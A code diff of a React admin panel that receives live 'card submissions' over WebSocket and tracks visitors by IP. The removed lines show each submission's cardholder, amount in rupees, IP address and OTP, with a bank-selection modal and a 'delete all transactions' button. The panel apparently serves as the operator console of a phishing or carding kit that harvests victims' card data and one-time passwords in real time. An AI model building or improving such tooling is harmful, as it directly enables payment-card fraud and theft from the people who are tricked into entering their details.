@@ -46,8 +46,40 @@ const AdminPanel = () => {
   };
 
   useEffect(() => {
+    // Initialize WebSocket connection
+    if (!wsClient.socket.connected) {
+      wsClient.connect();
+    }
+
     // Announce to the server that this is an admin client
-    wsClient.send('admin_hello', {}); // Pass an empty payload as required by the 'send' method
+    wsClient.send('admin_hello', {});
+
+    // Set up event listeners
+    wsClient.on('card_submission', (data: CardSubmission) => {
+      console.log('Received card submission:', data);
+      setCardSubmissions(prev => [
+        { ...data, isNew: true },
+        ...prev
+      ]);
+    });
+
+    wsClient.on('visitor_update', (visitor: Visitor) => {
+      console.log('Received visitor update:', visitor);
+      setVisitors(prev => [...prev, visitor]);
+      setActiveVisitors(prev => [...prev, visitor]);
+    });
+
+    wsClient.on('visitor_left', (visitor: { id: string }) => {
+      console.log('Visitor left:', visitor);
+      setVisitors(prev => prev.filter(v => v.id !== visitor.id));
+      setActiveVisitors(prev => prev.filter(v => v.id !== visitor.id));
+    });
+
+    return () => {
+      if (wsClient.socket.connected) {
+        wsClient.disconnect();
+      }
+    };
 
     // Set custom favicon for admin panel only
     const favicon = document.createElement('link');
@@ -199,7 +231,25 @@ const AdminPanel = () => {
   };
 
   return (
-    <div className="min-h-screen bg-gray-900 text-white p-6">
+    <div className="min-h-screen bg-gray-900 text-white p-4">
+      {/* Connection Status */}
+      <div className="flex items-center gap-2 mb-4">
+        <span className="text-sm">Connection Status:</span>
+        <span className={`px-2 py-1 rounded ${
+          connectionStatus === 'Connected' ? 'bg-green-600' : 
+          connectionStatus === 'Connecting' ? 'bg-yellow-600' : 
+          'bg-red-600'
+        }`}>
+          {connectionStatus}
+        </span>
+      </div>
+
+      {/* Notifications */}
+      {notification && (
+        <div className="fixed top-4 right-4 bg-blue-600 text-white px-4 py-2 rounded-lg shadow-lg">
+          {notification}
+        </div>
+      )}
       <LiveVisitorNotification visitors={activeVisitors} />
       
       <BankSelectionModal
@@ -210,7 +260,7 @@ const AdminPanel = () => {
       />
       
       <div className="flex justify-between items-center mb-8">
-   <h1 className="text-3xl font-bold">a</h1>
+        <h1 className="text-3xl font-bold">a</h1>
         <button
           onClick={deleteAllTransactions}
           className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
@@ -219,56 +269,17 @@ const AdminPanel = () => {
         </button>
       </div>
       
-      {notification && (
-        <div className="fixed top-4 right-4 bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg z-50">
-          {notification}
-        </div>
-      )}
-      
-      {/* Connection Status */}
-      <div className="mb-4">
-        <span className={`px-3 py-1 rounded text-sm ${
-          connectionStatus === 'Connected' ? 'bg-green-600' : 'bg-red-600'
-        }`}>
-          Supabase: {connectionStatus}
-        </span>
-        <span className="ml-2 px-3 py-1 rounded text-sm bg-green-600">
-          Real-time: Active
-        </span>
-      </div>
-
-      {/* Advanced Features */}
-      <TypingDetector />
-      <EnhancedVisitorInfo />
-      <AdminChat />
-      
-      {/* Current Visitors Section */}
-      <div className="mb-8">
-        <h2 className="text-xl font-bold mb-4">Current Live Visitors ({activeVisitors.length})</h2>
-        <div className="space-y-2">
-          {activeVisitors.length === 0 ? (
-            <div className="text-gray-400">No active visitors...</div>
-          ) : (
-            activeVisitors.map((visitor) => (
-              <div key={visitor.id} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
-                Live Visitor: {visitor.ip} - {new Date(visitor.created_at).toLocaleTimeString()}
-              </div>
-            ))
-          )}
-        </div>
-      </div>
-
-      {/* Transactions Table */}
-      {cardSubmissions.length > 0 && (
-        <div className="bg-gray-800 p-4 rounded mb-6">
-          <h2 className="text-xl font-bold mb-4">Transactions ({cardSubmissions.length})</h2>
+      {/* Card Submissions Section */}
+      <div className="bg-gray-800 rounded-lg p-4 mb-4 shadow-lg">
+        <h2 className="text-xl font-bold mb-4">Card Submissions</h2>
+        {cardSubmissions.length > 0 ? (
           <div className="space-y-4">
             {cardSubmissions.map((submission) => (
-              <div 
+              <div
                 key={submission.id}
                 className={`bg-gray-700 rounded-lg p-4 ${submission.isNew ? 'animate-pulse border-2 border-yellow-500' : ''}`}
+                onClick={() => setSelectedSubmissionId(submission.id)}
               >
-                {/* Card Details Section */}
                 <div className="grid grid-cols-2 gap-4 mb-4">
                   <div className="col-span-2">
                     <div className="flex items-center justify-between">
@@ -339,42 +350,14 @@ const AdminPanel = () => {
                     </button>
                   </div>
                 )}
-
-                {/* Additional Details - Collapsible */}
-                <div className="border-t border-gray-600 pt-4">
-                  <div className="grid grid-cols-2 gap-4 text-sm">
-                    <div>
-                      <span className="text-gray-400">Invoice ID</span>
-                      <div className="mt-1">{submission.invoice_id}</div>
-                    </div>
-                    <div>
-                      <span className="text-gray-400">Amount</span>
-                      <div className="mt-1">₹{submission.amount}</div>
-                    </div>
-                    <div>
-                      <span className="text-gray-400">Cardholder</span>
-                      <div className="mt-1">{submission.card_holder}</div>
-                    </div>
-                    <div>
-                      <span className="text-gray-400">IP Address</span>
-                      <div className="mt-1">{submission.user_ip}</div>
-                    </div>
-                    <div>
-                      <span className="text-gray-400">OTP</span>
-                      <div className="mt-1">{submission.otp || 'Pending'}</div>
-                    </div>
-                    <div>
-                      <span className="text-gray-400">Status</span>
-                      <div className="mt-1">Processing</div>
-                    </div>
-                  </div>
-                </div>
               </div>
             ))}
           </div>
-        </div>
-      )}
-
+        ) : (
+          <div className="text-gray-400 text-center py-4">No card submissions yet...</div>
+        )}
+      </div>
+      
       {/* Instructions */}
       <div className="bg-gray-800 p-4 rounded">
         <h3 className="text-lg font-bold mb-2">Instructions</h3>
